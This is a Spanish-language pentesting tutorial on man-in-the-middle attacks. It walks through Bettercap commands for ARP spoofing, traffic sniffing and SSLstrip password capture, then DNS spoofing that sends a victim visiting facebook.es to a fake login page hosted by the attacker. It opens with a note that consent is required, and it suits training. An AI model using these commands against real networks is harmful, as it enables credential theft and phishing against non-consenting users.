
# Man in the middle

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a interceptar el tráfico de red del objetivo, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

En un ataque MITM, el atacante puede interceptar la comunicación entre dos partes, como un usuario y un servidor web, y suplantar a ambas partes para obtener información confidencial, como credenciales de inicio de sesión, datos bancarios, información personal o incluso contenido en línea. El atacante también puede manipular el tráfico de red para redirigir a las víctimas a sitios web maliciosos o para realizar ataques de phishing.

Un ataque MiTM ocurre cuando un ciberdelincuente toma el control de un dispositivo sin que el usuario lo sepa. Con ese nivel de acceso, el atacante puede interceptar y capturar información sobre el usuario antes de retransmitirla a su destino. Estos tipos de ataques se utilizan a menudo para robar información financiera.

Hay muchos tipos de malware que poseen capacidades de ataque MiTM.

## <mark style="color:purple;">Ver dispositivos en nuestra red local</mark>

{% code title="En kali Linux" %}

```
sudo arp-scan -I eth0 --localnet
```

{% endcode %}

## <mark style="color:purple;">Bettercap</mark>

Bettercap es una de las mejores herramientas para la realización de ataques de suplantación de identidad, ataques MITM, análisis de protocolos y análisis de tráfico de red. Es compatible con Windows, Linux y macOS.

### Empleo

```bash
sudo bettercap
help
```

* Vemos los módulos que están corriendo

<figure><img src="/files/NSOS0jrV5dAh57Lv65w6" alt=""><figcaption><p>Módulos corriendo en Bettercap</p></figcaption></figure>

<table><thead><tr><th width="333">Comando</th><th>Descripción</th></tr></thead><tbody><tr><td><code>bettercap</code></td><td>Inicia Bettercap</td></tr><tr><td><code>set interface wlan0</code></td><td>Establece la interfaz de red (sustituye wlan0)</td></tr><tr><td><code>net.show</code></td><td>Muestra información sobre la red</td></tr><tr><td><code>net.probe on</code></td><td>Inicia el escaneo de hosts en la red</td></tr><tr><td><code>set target 192.168.0.1</code></td><td>Establece un objetivo específico en la red</td></tr><tr><td><code>arp.spoof on</code></td><td>Inicia un ataque de envenenamiento ARP</td></tr><tr><td><code>net.sniff on</code></td><td>Inicia la captura de paquetes en la red</td></tr><tr><td><code>set http.proxy.sslstrip true</code></td><td>Habilita SSLstrip para ataques MITM en HTTP</td></tr><tr><td><code>set dns.spoof.domains example.com</code></td><td>Establece dominios DNS falsos para spoofing</td></tr><tr><td><code>set net.sniff.verbose true</code></td><td>Muestra información detallada en la captura de red</td></tr><tr><td><code>set autopwn.target all</code></td><td>Selecciona todos los objetivos para el autopwn</td></tr><tr><td><code>autopwn on</code></td><td>Inicia el ataque autopwn</td></tr><tr><td><code>help</code></td><td>Muestra la ayuda y la lista de comandos</td></tr><tr><td><code>exit</code></td><td>Sale de Bettercap</td></tr></tbody></table>

### Ver dispositivos en la red

{% code title="En Bettercap" %}

```bash
net.probe on
ticker on
```

{% endcode %}

<figure><img src="/files/b7O1WwBYjrbf3HMTvKRP" alt=""><figcaption><p>Dispositivos conectados a nuestra red</p></figcaption></figure>

Vamos a necesitar la IP de la máquina conectada a nuestra red.

## <mark style="color:purple;">ARP Spoofing</mark>

Sirve para ponerse en medio de la comunicación entre la víctima y internet. Para este ejemplo vamos a usar un equipo víctima Windows:

{% code title="En la máquina objetivo" %}

```powershell
arp -a
tracert www.google.com 
```

{% endcode %}

<figure><img src="/files/gLkqxT6cZ5UkuG01Yhz6" alt=""><figcaption><p>ARP Spoofing funcionando</p></figcaption></figure>

{% code title="En Kali Linux" %}

```bash
sudo bettercap
set arp.spoof.targets {IP-TARGET}
arp.spoof on
```

{% endcode %}

<figure><img src="/files/FfKThUETeWZl9tzyOI09" alt=""><figcaption><p>ARP Spoofing</p></figcaption></figure>

#### Ver todo el tráfico de la red en Bettercap

```bash
set net.sniff.verbose false net.sniff on
```

#### Capturar contraseñas con cobertura de proxy https

```bash
set http.proxy.sslstrip true
set net.sniff.verbose false
set arp.spoof.targets {IP-TARGET}
arp.spoof.fullduplex true
arp.spoof on
http.proxy on
net.sniff on
```

### <mark style="color:purple;">Sniffing con WireShark</mark>

Una vez iniciado el ARP Spoofing podríamos monitorear todo el tráfico de red del objetivo, capturando las peticiones HTTP con WireShark

<figure><img src="/files/mmfTu6yfSL2uz3Wpk4oD" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">DNS Spoofing</mark>

Sirve por ejemplo para crear una pagina falsa donde un usuario al loguearse deje sus datos de login y contraseña. La página web falsa se alojará en nuestro localhost de Kali Linux

### 1. Arrancar servidor Apache

{% code title="En Kali Linux" %}

```bash
sudo service apache2 restart
```

{% endcode %}

* Buscar en el navegador -> localhost

### 2. Sustituir página de index en localhost

En nuestro Kali Linux:

```bash
cd /var/www/html
sudo rm index.html
echo “<h1> Visitando la página web del atacante</h1> > index.html
```

* Aquí podemos meter la página html que queramos.

{% hint style="info" %}
**Idea**: Podríamos clonar una página web con setoolkit > Social Engineering Attacks > Website Attack Vectors > Web Jacking > Site Cloner
{% endhint %}

### 3. Iniciar el DNS Spoofing

```bash
sudo bettercap
set arp.spoof.targets {IP-TARGET}
arp.spoof on
set dns.spoof
set dns.spoof.domains facebook.es # O cualquier pagina web que queramos suplantar
set dns.spoof adress {IP-ATACANTE}
dns.spoof on
```

Una vez que la víctima acceda a `facebook.com` accederá a nuestro página fake.
